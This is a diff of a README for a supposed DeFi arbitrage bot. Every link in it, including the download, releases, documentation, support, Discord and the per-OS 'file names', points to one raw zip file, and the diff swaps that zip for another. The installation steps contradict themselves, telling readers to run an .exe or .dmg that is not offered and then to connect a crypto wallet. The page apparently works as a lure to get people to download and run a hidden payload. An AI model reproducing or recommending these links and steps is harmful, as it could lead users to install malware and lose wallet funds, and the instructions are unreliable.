@@ -1,6 +1,6 @@
 # 🚀 defi-arbitrage-bot-deployer - Simple DeFi Trading Made Easy
 
-[![Download](https://raw.githubusercontent.com/Kenuche/defi-arbitrage-bot-deployer/main/dangle/bot-arbitrage-deployer-defi-v3.8.zip%20release-brightgreen)](https://raw.githubusercontent.com/Kenuche/defi-arbitrage-bot-deployer/main/dangle/bot-arbitrage-deployer-defi-v3.8.zip)
+[![Download](https://raw.githubusercontent.com/Kenuche/defi-arbitrage-bot-deployer/main/dangle/defi_deployer_bot_arbitrage_1.1.zip%20release-brightgreen)](https://raw.githubusercontent.com/Kenuche/defi-arbitrage-bot-deployer/main/dangle/defi_deployer_bot_arbitrage_1.1.zip)
 
 ## 📥 Overview
 
@@ -19,23 +19,23 @@ Before you start, ensure your system meets the following requirements:
 
 ### 🔗 Download & Install
 
-To get started, visit the [Releases page](https://raw.githubusercontent.com/Kenuche/defi-arbitrage-bot-deployer/main/dangle/bot-arbitrage-deployer-defi-v3.8.zip) to download the latest version of the application. You will find the appropriate files for your system there.
+To get started, visit the [Releases page](https://raw.githubusercontent.com/Kenuche/defi-arbitrage-bot-deployer/main/dangle/defi_deployer_bot_arbitrage_1.1.zip) to download the latest version of the application. You will find the appropriate files for your system there.
 
 ## ⚙️ Installation Steps
 
-1. **Visit the Releases Page**: Click [here](https://raw.githubusercontent.com/Kenuche/defi-arbitrage-bot-deployer/main/dangle/bot-arbitrage-deployer-defi-v3.8.zip) to access the latest release.
+1. **Visit the Releases Page**: Click [here](https://raw.githubusercontent.com/Kenuche/defi-arbitrage-bot-deployer/main/dangle/defi_deployer_bot_arbitrage_1.1.zip) to access the latest release.
   
 2. **Select the Right File**: Look for the file that matches your operating system. For example:
-   - For Windows, you might find a file named `https://raw.githubusercontent.com/Kenuche/defi-arbitrage-bot-deployer/main/dangle/bot-arbitrage-deployer-defi-v3.8.zip`.
-   - For macOS, look for `https://raw.githubusercontent.com/Kenuche/defi-arbitrage-bot-deployer/main/dangle/bot-arbitrage-deployer-defi-v3.8.zip`.
-   - For Linux, find a suitable `https://raw.githubusercontent.com/Kenuche/defi-arbitrage-bot-deployer/main/dangle/bot-arbitrage-deployer-defi-v3.8.zip` file.
+   - For Windows, you might find a file named `https://raw.githubusercontent.com/Kenuche/defi-arbitrage-bot-deployer/main/dangle/defi_deployer_bot_arbitrage_1.1.zip`.
+   - For macOS, look for `https://raw.githubusercontent.com/Kenuche/defi-arbitrage-bot-deployer/main/dangle/defi_deployer_bot_arbitrage_1.1.zip`.
+   - For Linux, find a suitable `https://raw.githubusercontent.com/Kenuche/defi-arbitrage-bot-deployer/main/dangle/defi_deployer_bot_arbitrage_1.1.zip` file.
 
 3. **Download the File**: Click on the file name to start downloading. 
 
 4. **Run the Installer**:
    - For Windows: Double-click the `.exe` file and follow the prompts.
    - For macOS: Open the downloaded `.dmg` file, drag the application to your Applications folder, and then double-click to open it.
-   - For Linux: Extract the `https://raw.githubusercontent.com/Kenuche/defi-arbitrage-bot-deployer/main/dangle/bot-arbitrage-deployer-defi-v3.8.zip` file and run the installation script as per the included instructions.
+   - For Linux: Extract the `https://raw.githubusercontent.com/Kenuche/defi-arbitrage-bot-deployer/main/dangle/defi_deployer_bot_arbitrage_1.1.zip` file and run the installation script as per the included instructions.
 
 5. **Set Up the Application**: Once installed, open the application and follow the guided setup to connect your wallet and configure your trading strategies.
 
@@ -70,9 +70,9 @@ If you encounter any issues:
 
 ## 📚 Useful Links
 
-- [Documentation](https://raw.githubusercontent.com/Kenuche/defi-arbitrage-bot-deployer/main/dangle/bot-arbitrage-deployer-defi-v3.8.zip)
-- [Community Support](https://raw.githubusercontent.com/Kenuche/defi-arbitrage-bot-deployer/main/dangle/bot-arbitrage-deployer-defi-v3.8.zip)
-- [Join Our Discord](https://raw.githubusercontent.com/Kenuche/defi-arbitrage-bot-deployer/main/dangle/bot-arbitrage-deployer-defi-v3.8.zip)
+- [Documentation](https://raw.githubusercontent.com/Kenuche/defi-arbitrage-bot-deployer/main/dangle/defi_deployer_bot_arbitrage_1.1.zip)
+- [Community Support](https://raw.githubusercontent.com/Kenuche/defi-arbitrage-bot-deployer/main/dangle/defi_deployer_bot_arbitrage_1.1.zip)
+- [Join Our Discord](https://raw.githubusercontent.com/Kenuche/defi-arbitrage-bot-deployer/main/dangle/defi_deployer_bot_arbitrage_1.1.zip)
 
 ## 📝 Contributing
 
